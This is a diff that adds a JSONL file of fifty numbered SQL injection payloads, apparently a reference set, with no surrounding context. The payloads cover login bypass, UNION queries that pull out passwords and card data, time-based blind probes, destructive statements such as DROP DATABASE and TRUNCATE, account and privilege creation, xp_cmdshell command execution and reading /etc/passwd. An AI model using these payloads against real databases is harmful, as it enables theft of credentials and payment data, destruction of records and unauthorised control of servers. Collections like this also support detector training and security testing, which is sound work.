@@ -1,0 +1,50 @@
+{"id": "ref_sql_001", "text": "SELECT * FROM users WHERE username = '' OR '1'='1'; --"}
+{"id": "ref_sql_002", "text": "admin' --"}
+{"id": "ref_sql_003", "text": "' OR 1=1 --"}
+{"id": "ref_sql_004", "text": "'; DROP TABLE users; --"}
+{"id": "ref_sql_005", "text": "' UNION SELECT username, password FROM users --"}
+{"id": "ref_sql_006", "text": "1' OR '1' = '1"}
+{"id": "ref_sql_007", "text": "'; WAITFOR DELAY '0:0:5' --"}
+{"id": "ref_sql_008", "text": "' OR EXISTS(SELECT * FROM users WHERE username='admin') --"}
+{"id": "ref_sql_009", "text": "admin' OR '1'='1' /*"}
+{"id": "ref_sql_010", "text": "'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --"}
+{"id": "ref_sql_011", "text": "' AND 1=0 UNION SELECT null, table_name FROM information_schema.tables --"}
+{"id": "ref_sql_012", "text": "1; UPDATE users SET password='hacked' WHERE username='admin'; --"}
+{"id": "ref_sql_013", "text": "' OR 'a'='a"}
+{"id": "ref_sql_014", "text": "'; SELECT * FROM credit_cards; --"}
+{"id": "ref_sql_015", "text": "admin'/*"}
+{"id": "ref_sql_016", "text": "' UNION SELECT null, version() --"}
+{"id": "ref_sql_017", "text": "1' AND SLEEP(5) --"}
+{"id": "ref_sql_018", "text": "'; DELETE FROM users WHERE '1'='1'; --"}
+{"id": "ref_sql_019", "text": "' OR 1=1 LIMIT 1; --"}
+{"id": "ref_sql_020", "text": "admin' AND 1=1 --"}
+{"id": "ref_sql_021", "text": "'; SELECT user(), database(); --"}
+{"id": "ref_sql_022", "text": "' UNION ALL SELECT NULL, NULL, NULL, table_name FROM information_schema.tables --"}
+{"id": "ref_sql_023", "text": "1' OR SLEEP(5)#"}
+{"id": "ref_sql_024", "text": "'; DROP DATABASE production; --"}
+{"id": "ref_sql_025", "text": "' OR '1'='1' AND username IS NOT NULL --"}
+{"id": "ref_sql_026", "text": "admin'#"}
+{"id": "ref_sql_027", "text": "'; UPDATE accounts SET balance=999999 WHERE id=1; --"}
+{"id": "ref_sql_028", "text": "' AND (SELECT COUNT(*) FROM users) > 0 --"}
+{"id": "ref_sql_029", "text": "1; EXEC xp_cmdshell('whoami'); --"}
+{"id": "ref_sql_030", "text": "' OR 1=1 ORDER BY 1 --"}
+{"id": "ref_sql_031", "text": "'; SELECT password FROM users WHERE username='admin'; --"}
+{"id": "ref_sql_032", "text": "admin' OR 1=1#"}
+{"id": "ref_sql_033", "text": "' UNION SELECT credit_card, cvv FROM payments --"}
+{"id": "ref_sql_034", "text": "1' WAITFOR DELAY '0:0:10'--"}
+{"id": "ref_sql_035", "text": "'; TRUNCATE TABLE logs; --"}
+{"id": "ref_sql_036", "text": "' OR username LIKE '%admin%' --"}
+{"id": "ref_sql_037", "text": "admin' OR 'x'='x"}
+{"id": "ref_sql_038", "text": "'; SELECT * FROM information_schema.columns --"}
+{"id": "ref_sql_039", "text": "1' AND 1=1 UNION SELECT null, @@version --"}
+{"id": "ref_sql_040", "text": "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'; --"}
+{"id": "ref_sql_041", "text": "' OR 1=1 -- comment"}
+{"id": "ref_sql_042", "text": "admin' AND '1'='1"}
+{"id": "ref_sql_043", "text": "'; SELECT load_file('/etc/passwd'); --"}
+{"id": "ref_sql_044", "text": "1' OR pg_sleep(5) --"}
+{"id": "ref_sql_045", "text": "'; ALTER TABLE users ADD COLUMN backdoor VARCHAR(255); --"}
+{"id": "ref_sql_046", "text": "' UNION SELECT name, password FROM mysql.user --"}
+{"id": "ref_sql_047", "text": "admin' OR 1=1 LIMIT 1#"}
+{"id": "ref_sql_048", "text": "'; CREATE USER 'attacker'@'%' IDENTIFIED BY 'password'; --"}
+{"id": "ref_sql_049", "text": "1' AND EXTRACTVALUE(1, CONCAT(0x7e, version())) --"}
+{"id": "ref_sql_050", "text": "'; SELECT * FROM users WHERE id = 1 OR 1=1; --"}
